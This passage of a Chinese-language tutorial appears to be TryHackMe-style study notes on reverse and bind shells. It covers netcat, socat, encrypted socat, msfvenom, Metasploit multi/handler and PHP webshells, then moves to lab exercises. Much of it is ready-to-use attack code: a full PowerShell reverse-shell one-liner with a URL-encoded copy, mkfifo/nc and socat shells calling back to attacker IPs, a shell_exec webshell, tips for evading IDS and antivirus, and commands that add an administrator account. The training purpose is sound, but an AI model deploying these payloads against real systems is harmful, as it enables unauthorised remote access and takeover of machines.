请注意，有些目标可能需要指定Python 版本，如果是这样的话：根据需要将 python 替换为 python2 或 python3 。 这时我们的 shell 会看起来更好一些，但是我们仍然不能使用tab键自动补全功能或者方向键功能,按下Ctrl + C 仍然会杀死这个shell 。 第二步是：执行export TERM=xterm ，这将使我们能够访问一些术语命令，例如clear命令。 最后(也是最重要的) ，我们将使用 Ctrl + Z按键对 shell 进行后台化处理，对shell后台化之后再前台化：用 stty raw -echo; fg 回到我们自己的终端前台。 执行上面的前台化命令，将会做两件事: 首先，这个前台化命令会关闭我们自己本身的终端输出 (它允许我们访问tab键自动补全、方向键和按下 Ctrl + C 终止进程)，然后再将之前建立的反向shell 前台化，从而完成稳定化过程。 完整的过程如下（实质上是用反向shell取代了我们自己原来使用的终端）： 注意：如果 shell 失效，你的终端中的任何输入都将不可见(这是由于原终端回显被禁用)。要解决这个问题，请输入reset命令，然后按下回车键。 技巧2: rlwrap rlwrap是一个程序，简单地说，它可以让我们在捕获到shell时立即访问历史记录、 tab自动补全键和方向键；然而，如果你想在这个shell 中使用 Ctrl + C，还是必须使用一些其他技巧进一步稳定化shell。 默认情况下，kali没有安装rlwrap，所以如果要在kali中使用rlwrap，请先安装一下： sudo apt install rlwrap 要使用 rlwrp，我们需要调用一个稍微不同的监听器: rlwrap nc -lvnp &lt;port&gt; 在netcat监听器前面加上\" rlwrap \"可以提供一个功能更全面的 shell。这个技巧在处理 Windows的shell时特别有用，因为众所周知，Windows的shell很难稳定。 在处理 Linux 目标时，可以使用与前面第一个技巧中的第三个步骤相同的方法来完全稳定化shell：先用 Ctrl + Z 后台化 shell，然后再使用stty raw-echo; fg 命令来稳定化并重新进入 shell。 技巧3: Socat 稳定shell的第三个简单方法是使用一个初始的 netcat shell作为进入功能更全面的 socat shell的垫脚石。请记住，这种技巧最好是针对 Linux 目标，因为 Windows 上的 Socat shell 不会比 netcat shell 更稳定。 为了实现这种稳定方法，我们首先需要将一个 socat 静态编译的二进制文件(编译为没有依赖关系的程序的一个版本)传输到目标机器上。一个典型的实现方法是：让攻击机在包含 socat 二进制文件的目录中开启一个简易的webserver(sudo python3 -m http.server 80)。然后在目标机器上使用netcat shell界面下载文件，在 Linux 上，这可以通过 curl 或 wget (wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat)来完成。 为了完整性起见，在这里附上目标机是Windows操作系统的情况: 在一个 Windows CLI（命令行）环境中，同样的事情（下载socat文件）也可以在 Powershell 中完成，使用 Invoke-WebRequest 或者 webrequest 系统类， 这取决于安装的 Powershell 版本(Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\\\Windows\\temp\\socat.exe)。 在接下来的小节中，我们将介绍使用Socat发送和接收shell的语法。 socat二进制文件下载地址（点击将自动下载）： https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat socat官网： http://www.dest-unreach.org/ 使用以上任何一种技术，都可以更改终端 tty 大小，这是你的终端在使用常规 shell 时会自动完成的事情; 但是，如果你想打开类似文本编辑器的东西来覆盖屏幕上的所有内容（即：在终端中打开文本编辑器），那么必须在反向或绑定 shell 中手动完成终端界面宽高尺寸的更改。 首先，打开另一个终端并运行 stty-a ，这将为你提供大量的输出流，记下开头部分\" 行 “和” 列 \"的值: 接下来，在反向/绑定 shell 中输入以下两个命令: stty rows &lt;number&gt; #and stty cols &lt;number&gt; 填写你刚才在自己的终端上运行 stty-a 命令所得到的行和列的值。 这将改变反向/绑定shell界面的宽度和高度，从而使一些程序，如文本编辑器，能够依赖于这些宽高信息的准确性来正确地打开。 0x06 Socat Socat 在某些方面与 netcat 相似，但在其他许多方面有根本不同。理解socat 的最简单方法是把它当做一个两点之间的连接器。这两个点实际上可以是一个监听端口和键盘，也可以是一个监听端口和一个文件，或者可以是两个监听端口，而socat 所做的只是提供两点之间的链接。 让我们再次从反向 shell 开始。 Reverse Shells（反向shell） 如前所述，socat 的语法比 netcat 的语法难得多，下面是在socat 中设置反向 shell 监听器的基本语法: socat TCP-L:&lt;port&gt; - 在socat中，这需要获取两个点(一个监听端口和一个标准输入)并将它们连接在一起，如此建立的 shell 是不稳定的，但它可以在 Linux 或 Windows 上工作，相当于Netcat中的 nc -lvnp &lt;port&gt;. 在Windows操作系统的目标机上，我们使用这个命令来连接攻击机: socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes “pipes”选项用于强制 powershell (或 cmd.exe)使用 Unix 风格的标准输入和输出形式。 在Linux系统的目标机上，使用以下命令来连接攻击机： socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:\"bash -li\" Bind Shells（绑定shell） 在 Linux 目标上，我们将使用以下命令设置监听器: socat TCP-L:&lt;PORT&gt; EXEC:\"bash -li\" 在 Windows 目标上，我们将使用以下命令设置监听器: socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes 我们使用\" pipes \"参数来连接 Unix 和 Windows 在 CLI （命令行）环境中处理输入和输出的方式。 不管目标是什么，我们在攻击机器上使用以下命令来连接到 正在目标机上等待的监听器： socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; - 现在让我们看看 Socat 更强大的用途之一：建立完全稳定的 Linux tty 反向 shell。这仅在目标是 Linux 时有效，会建立一个更稳定的反向shell。 如前所述，socat 是一个非常通用的工具，以下技巧可能是其最有用的应用之一，这是新的监听器设置语法： socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0 让我们分析此命令，像往常一样，我们将两个点连接在一起，但是在这里的点是监听端口和文件。 具体地说，我们将当前的 TTY （TTY含义为：终端）作为文件传递并将它的回显设置为零。这大约相当于使用 Ctrl + Z以及netcat shell 的stty raw -echo; fg技巧，这样处理的额外好处是能够立即建立一个稳定的shell并能连接到完整的 tty（终端）。 普通的socat监听器可以连接到任何有效负载；然而，上面这个特殊的监听器必须用一个非常具体的 socat 命令来激活，这意味着目标机必须安装 socat。 大多数机器默认情况下没有安装socat，但是，我们可以上传一个预编译的socat二进制文件，然后继续正常执行我们的命令。 预编译的socat二进制文件：https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true 特殊命令如下： socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane 这是一个很复杂的命令，所以让我们分解一下。 第一部分很简单——我们正在 与在我们自己的攻击机上运行的监听器进行连接，第二部分使用 EXEC:“bash -li” 创建一个交互式 bash 会话，我们还传递了参数：pty、stderr、sigint、setsid 和 sane pty：在目标上分配一个伪终端——这是稳定化过程的一部分 stderr：确保在 shell 中能够显示错误消息（通常是非交互式 shell 的问题） sigint：将任何 Ctrl + C 命令传递到子进程中，允许我们在 shell 中使用 Ctrl+C 终止命令 setsid：在新会话中创建进程 sane：稳定终端，试图将终端“正常化”。 这看起来有很多东西需要考虑，所以让我们看看它的实际效果。 在左边我们有一个监听器运行在我们的本地攻击机上，在右边我们有一个已经建立好的反向shell，正在使用非交互式 shell 运行。我们使用非交互式的netcat shell，执行特殊的 socat 命令，并在左侧的 socat 监听器中接收一个完全交互式的 bash shell: 请注意，socat shell 是完全交互式的，允许我们使用交互式命令，例如 SSH。 然后我们还可以通过 设置上一个小节中所提到的 stty 值来进一步改进shell，这将让我们能够更好地使用文本编辑器，如 Vim 或 Nano。 如果socat shell 突然无法正常工作，则可以通过在命令中添加 -d -d 来增加信息输出的详细程度，这在实验环境下非常有用，但在一般用途中通常不是必需的。 0x07 Socat加密shell Socat 的许多优点之一就是它能够创建加密的 shell ——绑定shell和反向shell。除非你有解密密钥，否则无法监视加密的 shell，这样通常能够绕过 IDS检测。 我们在前面讨论了如何创建基本的 shell，因此在这里不再讨论一些基本语法。 可以说，只要把 TCP 用作命令的一部分，就应该在使用加密shell 时将其替换为 OPENSSL。 我们将在本小节结束时介绍一些示例，但首先让我们谈谈证书。 加密反向shell 为了建立加密的shell，我们首先需要生成一个证书，这在我们的攻击机上很容易做到: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt 该命令会创建一个2048位的 RSA 密钥，以及一个匹配的 cert 文件，有自签名且有效期不到一年。当你运行此命令时，它将要求你填写有关证书的信息，你可以留空，也可以随机填写。 然后，我们需要将刚才两个创建的文件合并到一个.pem 文件中: cat shell.key shell.crt &gt; shell.pem 现在，当我们设置反向 shell 监听器时，可以使用以下命令: socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 - 这将使用我们生成的证书设置一个 OPENSSL 监听器，参数 verify=0 告诉连接不要费心尝试验证我们的证书是否已由公认的权威机构正确签名。 请注意，证书必须在正在监听的设备上使用（即：有监听器的地方就要有PEM文件）。 设置好监听器后，为了回连到该监听器，我们将使用: socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash 加密绑定shell 建立加密的绑定 shell 也采用 和上面同样的技巧: 目标机上 socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes 攻击机上 socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 - 再次注意：即使是针对 Windows 目标机建立绑定shell，证书也必须与监听器一起使用，因此需要为绑定 shell 复制 PEM 文件。 下图显示了来自 Linux 目标的 OPENSSL 反向 shell， 左边是攻击机终端界面，右边是已经建立的非交互式反向shell界面（右边的listener是自定义的别名）： 这种加密技巧也适用于上一个小节中介绍的特殊的、仅限 Linux 的 TTY（终端）反向shell —— 弄清楚它的语法将是本小节答题的关键。 socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0 #对socat tty技巧的加密处理--设置攻击机上的监听器 socat OPENSSL:10.10.10.5:53,verify=0 EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane #对socat tty技巧的加密处理--让目标机 0x08 常用shell payload 之前有提到我们正在寻找一些方法来使用 netcat 作为绑定 shell 的监听器，所以我们将从它开始。 在 netcat 的某些版本中，包括Windows 版的nc.exe（Kali Linux也附带了，位于 /usr/share/windows-resources/binaries），还有 Kali 本身使用的版本，即netcat-traditional，都有一个 -e 选项允许你在shell的连接上执行进程。 例如，在目标机上设置监听器时： nc -lvnp &lt;PORT&gt; -e /bin/bash 用 netcat 连接到上面的监听器将在目标上产生一个绑定 shell。 同样，对于反向 shell，在目标机上执行以下命令： nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash 目标机将回连攻击机上的监听器，这样会产生一个反向 shell。 但是，大多数版本的 netcat 都不包含此功能（指 -e选项），因为人们普遍认为它非常不安全。 在几乎总是需要静态二进制文件的 Windows目标机上，以上技巧（指 -e选项）将完美运行；然而，在 Linux的目标机上，我们将改为使用以下代码为绑定 shell 创建一个监听器： mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f #在linux目标机上执行 以下段落是此命令的技术说明——命令本身才是最重要的。 该命令首先会在 /tmp/f 处创建命名管道（FIFO–First In，First Out），然后它启动一个 netcat 监听器，并将监听器的输入连接到命名管道的输出。netcat 监听器的输出（即我们发送的命令）再直接通过管道（管道符\" | \"）传输到 sh，将 stderr 输出流发送到 stdout，并将 stdout 本身发送到命名管道的输入，从而完成循环。 关于命名管道的介绍：https://www.linuxjournal.com/article/2156 一个非常类似的命令可以用来发送 netcat 反向 shell: mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f #在linux目标机上执行 这个命令实际上与前一个命令相同，只是此命令将使用 netcat 主动连接语法，而不是使用 netcat 监听语法。(下图示例中的左侧使用了自定义别名) 当目标是一个现代的 Windows Server 时，建立 Powershell 反向 shell 是非常常见的，因此我们将在这里介绍标准的一行 PSH 反向 shell。 这个命令非常复杂，因此为了简单起见，这里不会直接解释它，记住，这是一行非常有用的命令: powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" 为了使用它，我们需要用适当的 IP 和端口选择来替换\"&lt;IP&gt;\" 和 “&lt;port&gt;”，然后将其复制到 cmd.exe shell中并执行该命令（或者使用 在 Windows 服务器上执行命令的另一种方法，例如 webshell），从而生成反向 shell： 对于其他常见的反向 shell 有效载荷，可以参考github上的PayloadsAllTheThings存储库，其中包含了多种不同语言的 shell 代码（通常以单行格式进行复制和粘贴）。 PayloadAllTheThings项目链接： https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md 0x09 Msfvenom生成shell payload Msfvenom作为 Metasploit 框架的一部分，主要用于生成用于反向和绑定 shell 的代码。 它被广泛用于开发低等级的exp，如：在开发缓冲区溢出漏洞exp时生成十六进制 shellcode；但是，它也可用于生成各种格式的有效负载（例如 .exe、.aspx、.war、.py）。 我们将在本节中使用Msfvenom的后一个功能。 msfvenom 的标准语法如下： msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt; 例如，要以 exe 格式生成 Windows x64反向 Shell，我们可以使用: msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt; 这里我们设定一个有效载荷涉及到四个参数选项: -f &lt;format&gt;:指定输出格式。 在上面的命令中，格式是一个可执行文件 (exe) -o &lt;file&gt;:生成的有效载荷（payload）的输出位置和文件名。 LHOST=&lt;IP&gt;:指定要回连的 IP（即攻击机IP）。 当你使用 TryHackMe 的VPN连接到你自己的攻击机时，这将是你的 tun0 IP 地址。 LPORT=&lt;port&gt;:要回连的本地攻击机上的端口。 可以是 0 到 65535 之间尚未使用的任何值；但是设定为低于 1024 的端口时将受到限制，需要以 root 权限运行监听器。 Staged vs Stageless（分段和不分段） 在我们进一步讨论之前，必须介绍另外两个概念：分段的反向 shell 有效负载、不分段的反向 shell 有效负载。 分段的反向shell有效载荷分两部分发送。第一部分称为stager，这是一段直接在服务器本身上执行的代码，它会回连攻击机上等待的监听器，但它本身并不包含任何反向 shell 代码。第一部分的stager将连接到监听器并使用连接来加载真正的有效载荷，这样能直接执行真正的payload并防止真正的payload接触到磁盘，以免被传统的反病毒解决方案拦截。 因此，此类有效载荷分为两部分——一个小的初始段，然后是在初始段启动时所下载的更大的反向 shell 代码段。 分段的有效载荷需要一个特殊的监听器——通常是Metasploit multi/handler，这将在下一个小节中介绍。 不分段的反向shell有效载荷更常见——这些也是我们迄今为止一直在使用的。 它们是完全独立的，因为在成功执行一段代码时会立即将 shell 发送回攻击机上等待的监听器。 不分段的有效载荷往往更易于使用和捕获； 但是，它们也更庞大，并且更容易被防病毒或入侵检测程序发现和删除。 分段的有效载荷更难使用，但它的初始段要短得多，有时会被效率较低的防病毒软件遗漏。 现代防病毒解决方案还将利用反恶意软件扫描接口 (AMSI：Anti-Malware Scan Interface) 来检测有效载荷，这使得分段有效载荷不如以前那么有效。 Meterpreter（英文意思是翻译器） 关于 Metasploit，另一个要讨论是 Meterpreter shell。 Meterpreter shell 是 Metasploit自带的的全功能 shell，它们是完全稳定的，这使得它们在针对Windows 目标机时效果非常好。Meterpreter shell 也有很多自己的内置功能，例如文件上传和下载。 如果我们想使用Metasploit 的后渗透工具，那么我们就需要先获得一个 Meterpreter shell。 Meterpreter shell 的缺点是它们必须在 Metasploit中才能捕获，它们也被某些认证考试禁止使用，因此学习关于Meterpreter的替代方法是个好主意。 有效载荷（payload）命名约定 使用 msfvenom 时，了解命名系统的工作原理很重要，基本的payload命名约定如下： &lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt; 例如: linux/x86/shell_reverse_tcp 这将为 x86 Linux 的目标机生成不分段的反向shell payload。 此基本命名约定的例外是Windows 32位操作系统的目标，对于该类目标，命名payload时，不会指定操作系统的架构位数，例如： windows/shell_reverse_tcp 对于64位的 Windows 目标，命名payload时，arch 将被指定为normal (x64) 。 我们把命名中关于payload的部分再细分一下。 在上面的示例中，使用的payload是 shell_reverse_tcp， 这表明它是一个不分段的payload。不分段的payload会用下划线 (_) 表示，与此payload等效的分段payload是：shell/reverse_tcp（分段payload会用一个斜杠/表示）。 这些规则也适用于 Meterpreter payload。一个针对Windows 64位目标的分段Meterpreter payload ，名称将如下所示： windows/x64/meterpreter/reverse_tcp 针对Linux 32位目标的不分段 Meterpreter payload，名称将如下所示： linux/x86/meterpreter_reverse_tcp 除了 msfconsole 手册页之外，使用 msfvenom 时要注意的另一个命令是：msfvenom --list payloads，这可用于列出所有可用的有效载荷，然后可以将其通过管道符传输到 grep 以搜索一组特定的有效载荷，例如： 这为我们提供了一整套针对 Linux 32位目标的 Meterpreter 有效载荷。 msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell lhost=10.10.10.5 lport=443 0x10 Metasploit multi/handler模块 Multi/Handler 是捕获反向 shell 的绝佳工具（multi/handler模块充当的是连接shell的监听器），如果你想使用 Meterpreter shell，这是必不可少的，并且这也是使用分段payload时的首选。 幸运的是，它相对容易使用: 使用\" msfconsole \"命令启动Metasploit 输入\" use multi/handler \"命令，按下回车键 我们现在准备开始一个multi/handler会话，让我们使用 options 命令查看可用的选项: 我们需要设置三个选项：payload、LHOST 和 LPORT。 这些都与我们在使用 Msfvenom 生成 shellcode 时设置的选项相同——特定于我们的目标的payload，以及我们可以接收 shell 的监听IP地址和端口。 请注意，在此处必须指定 LHOST，因为 metasploit 不会像 netcat 或 socat 那样监听所有网络接口； 所以你必须告诉它一个特定的地址以便进行监听（使用 TryHackMe 时，这将是你的 tun0 地址）。 我们使用以下命令设置这些选项： set PAYLOAD &lt;payload&gt; set LHOST &lt;listen-address&gt; set LPORT &lt;listen-port&gt; 我们现在应该已经准备好开始监听了！ 让我们通过使用\" exploit -j \"命令，这将告诉 Metasploit 启动模块并将其作为作业（job）在后台运行 你可能注意到在上面的截图中，Metasploit 正在监听一个1024以下的端口。为此，Metasploit 必须使用 sudo 权限运行。 当在前面的msfvenom中生成的分段payload开始运行时，Metasploit 将接收连接，并会发送剩余的payload然后给我们提供一个反向 shell: 请注意，因为在上面的案例中multi/handler 开始是在后台处理的，所以我们需要使用 \" sessions 1 “命令再次将其置于前台。 这很有效，因为它是唯一运行的会话。 如果还有其他活动的会话，我们将需要使用” sessions \"命令来查看所有活动的会话，然后使用sessions &lt;number&gt;命令来选择适当的会话置于前台。 这个数字也将显示在打开 shell 的行中（你能看到“Command Shell session 1 opened ”）。 0x11 webshell介绍 有时我们会遇到允许我们以某种方式上传可执行文件的网站。 理想情况下，我们会利用这个机会上传可以激活反向shell或绑定 shell 的代码，但有时这是不可能的。 所以在非理想情况下，我们将改为上传 webshell。（请参阅我之前写的关于上传漏洞的博客文章，以更广泛地了解此概念） “Webshell”是一个通俗的术语，用于指代在网络服务器（通常使用 PHP 或 ASP 等语言）中运行的脚本，该脚本能在服务器上执行代码。本质上，命令被输入到网页中——通过 HTML 表单，或者直接作为 URL 中的参数——然后由脚本执行，执行的结果返回并会写入网站页面。在另一方面，webshell也能够作为进入完全成熟的反向shell或绑定shell的垫脚石。 由于 PHP 仍然是最常见的服务器端脚本语言，让我们来看一些简单的PHP代码，以一种非常基础的单行格式书写: &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt; 这将在 URL 中获取一个 GET 参数，并使用\" shell_exec() \"在系统上执行它。 这意味着我们在URL 中的 \" ?cmd= \"之后输入的任何命令都将在系统上执行——无论是 Windows 还是 Linux。 \" pre \"元素是为了确保显示在网站页面上的结果的格式正确。 让我们看看实际情况: 请注意，当导航到shell.php页面时，我们在url中使用了带有\" ifconfig “命令的 GET 参数” cmd \"，然后正确地返回了目标的网络信息。 换句话说，通过在我们上传的shell.php页面的 URL 中输入 ifconfig 命令（该命令用于检查 Linux 目标上的网络接口），使得命令在系统上执行，并将结果返回给我们。 这适用于任何其他命令（例如 whoami、hostname、arch 等）。 如前所述，在 Kali 上默认有多种 webshell 可用，位于/usr/share/webshells路径下——包括臭名昭著的 PentestMonkey php-reverse-shell——一个用 PHP 编写的完整的反向 shell。 请注意，大多数通用的、特定语言的（例如 PHP）反向 shell 是为基于 Unix 的目标（例如 Linux 网络服务器）编写的，它们可能无法在 Windows 上运行。 PentestMonkey反向shell 链接： https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php 当目标是 Windows 时，通常使用 web shell 获取 RCE，或者使用 msfvenom 生成对应服务器语言的反向/绑定 shell。 前一种方法，通常是使用 URL 编码的 Powershell Reverse Shell 来获取 RCE。 这将作为前面提到的webshell中的cmd 参数复制到 URL 中： powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22 这与我们在第8小节中遇到的powershell shell 相同，但是，它经过了 URL 编码，可以在 GET 参数中安全使用。 请记住，IP 和端口（以上内容中的IP、PORT）仍然需要在上面的代码中进行更改。 0x12 获取shell之后的操作 好了，我们有shell了，现在怎么办？ 我们已经介绍了许多生成、发送和接收 shell 的方法，这些方法都有一个共同点，那就是得到的shell往往是不稳定的和非交互的。 即使是更容易稳定化的 Unix 风格的shell的稳定性也不是非常理想。 那么，我们能做些什么呢？ 理想情况下，在 Linux 上，我们会接着寻找机会访问用户帐户，存储在/home/&lt;user&gt;/.ssh的 SSH 密钥通常是执行此操作的理想方式。 在 CTF 中，在目标机的某处发现密码凭证也不少见，一些漏洞exp还允许你添加自己的帐户，特别是像 Dirty C0w（脏牛漏洞） 或可写的 /etc/shadow 文件或 /etc/passwd文件会很快让你通过 SSH 来访问目标机器，假设目标机器的SSH服务是打开的。 Dirty C0w（脏牛漏洞）介绍：https://dirtycow.ninja/ 而在 Windows 上，可利用的选项通常更加有限，有时可以在注册表中找到运行服务的密码。例如，VNC 服务器经常将密码以明文形式存储在注册表中，某些版本的 FileZilla FTP 服务器还会在 XML 文件中保留登录凭据，可能保留凭据的文件路径是： C:\\Program Files\\FileZilla Server\\FileZilla Server.xml #或者 C:\\xampp\\FileZilla Server\\FileZilla Server.xml #这些凭据可以是MD5散列值，也可以是明文，具体取决于版本 理想情况下，在 Windows 上，你将获得以 SYSTEM 用户身份运行的 shell，或以高权限运行的管理员帐户。 在这种情况下，你可以简单地将你自己的帐户（在管理员组中）添加到计算机，然后通过 RDP、telnet、winexe、psexec、WinRM 或其他方法登录，具体情况取决于目标机器上运行的服务。 其基本语法如下: net user &lt;username&gt; &lt;password&gt; /add #添加新用户 net localgroup administrators &lt;username&gt; /add #添加用户到管理员组 反向 shell 和绑定 shell 是在机器上获得远程代码执行的基本技术，但是，它们永远不会像原生 shell 那样功能齐全。 理想情况下，我们总是希望升级为使用“正常”方法来访问机器，因为这总是更容易用于进一步利用目标。 0x13 练习与实践 这个章节包含了大量的信息，并且几乎没有机会让你始终将其付诸实践。 接下来的实践与案例将包含两个虚拟机（一个 Ubuntu 18.04 服务器和一个 Windows 服务器），每个都配置有一个简单的网络服务器，请使用它上传和激活 shell。 在这个案例中提供的是一个沙盒环境，所以没有过滤器需要进行绕过，你可以选择登录以使用 netcat、socat 或meterpreter shell 进行练习，提供登录凭据和说明，同时还会给出一些shell示例。 Linux Practice Box 附加到此任务的盒子是一个 Ubuntu 服务器，其文件上传页面在网络服务器上运行。这应该用于在 Linux 系统上练习 shell 上传。同样，本机上也安装了 socat 和 netcat，因此请随意通过端口 22 上的 SSH 登录来直接使用它们进行练习。登录的凭据是： 用户名：shell 密码：TryH4ckM3! 练习1 准备一个webshell &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt; 接着在webshell页面连接攻击机监听端 练习2 进入shell文件目录，修改对应IP与端口 成功拿shell 练习3 ssh登录目标机 在目标机使用netcat建立监听端，并在攻击机使用nc连接目标端口即可拿到绑定shell 第二种方法，适用于linux系统 mkfifo /tmp/f; nc -lvnp 5555 &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f 也是成功拿到shell，接下来尝试练习反向shell mkfifo /tmp/f; nc 10.10.197.61 5555 &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f//目标机上执行 练习4 socat TCP-L:5555 //kali上执行 socat TCP:10.11.65.203:5555 EXEC:\"bash -li\" //目标机执行 可以看到回显会出现在两个机器上，下面是绑定shell socat TCP-L:5555 EXEC:\"bash -li\" //目标机执行 socat TCP:10.10.197.61:5555 - //kali执行 接下来尝试建立一个完美的交互式shell socat TCP:10.11.65.203:5555 EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane //目标机执行 socat TCP-L:5555 FILE:`tty`,raw,echo=0 //kali执行 接下来尝试socat的加密shell openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt cat shell.key shell.crt &gt; shell.pem socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 - //以上是kali执行，下面是目标机执行 socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash socat OPENSSL-LISTEN:5555,cert=shell.pem,verify=0 EXEC:/bin/bash //目标机执行 socat OPENSSL:10.10.197.61:5555,verify=0 - //kali执行 首先开始个http服务，上传对应shell.pem到目标机 练习5 这里尝试直接上传php_reverse_shell，但是无效 这说明该php_reverse_shell内容只适用于unix系统 练习6 尝试上传webshell，利用shell_exec执行powershell反弹shell脚本 &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt; powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.11.65.203',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" 练习7 可以在上面练习6的基础上，添加用户到管理员组，直接远程登录 net user &lt;username&gt; &lt;password&gt; /add #添加新用户 net localgroup administrators &lt;username&gt; /add #添加用户到管理员组 xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.90.86 /u:hybcx /p:'1234' #添加剪切板功能 练习8 netcat反向shell xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.90.86 /u:Administrator /p:'TryH4ckM3!' netcat绑定shell socat反向shell socat TCP-L:5555 - socat TCP:10.11.65.203:5555 EXEC:powershell.exe,pipes socat绑定shell socat TCP-L:5555 EXEC:powershell.exe,pipes socat TCP:10.11.65.203:5555 - 练习9 使用msfvenom生成exe之后直接复制到目标机上即可，接下来进入meterpreter的监听模块 练习10 使用练习9遗留的分段exe，发现弹回来的shell无法使用，不能回显信息，接下来尝试不分段的 如下图，依旧没反应 结果：不能，我们需要使用msf里面的multi/handler模块捕获meterpreter shell，用netcat并不能使这个shell正常工作。","tags":["Metasploit"],"categories":["Metasploit"]},{"title":"Metasploit学习2","path":"/2024/03/24/metasploit-xue-xi-2/","content":"0x01 简介 Meterpreter 是一个 Metasploit 有效负载，通过许多有价值的组件支持渗透测试过程。 Meterpreter 将在目标系统上运行，并充当命令和控制架构中的代理。您将与目标操作系统和文件进行交互，并使用 Meterpreter 的专用命令。 Meterpreter 有很多版本，根据目标系统提供不同的功能。 Meterpreter 是如何工作的 Meterpreter 在目标系统上运行，但未安装。它在内存中运行，不会将自身写入目标上的磁盘。此功能旨在避免在防病毒扫描期间被检测到。默认情况下，大多数防病毒软件将扫描磁盘上的新文件（例如，当您从互联网下载文件时）Meterpreter 在内存（RAM - 随机存取存储器）中运行，以避免将文件写入到磁盘上目标系统（例如 meterpreter.exe）。这样，Meterpreter 将被视为一个进程，并且在目标系统上没有文件。 Meterpreter 还旨在通过与运行 Metasploit 的服务器（通常是您的攻击机器）进行加密通信，避免被基于网络的 IPS（入侵防御系统）和 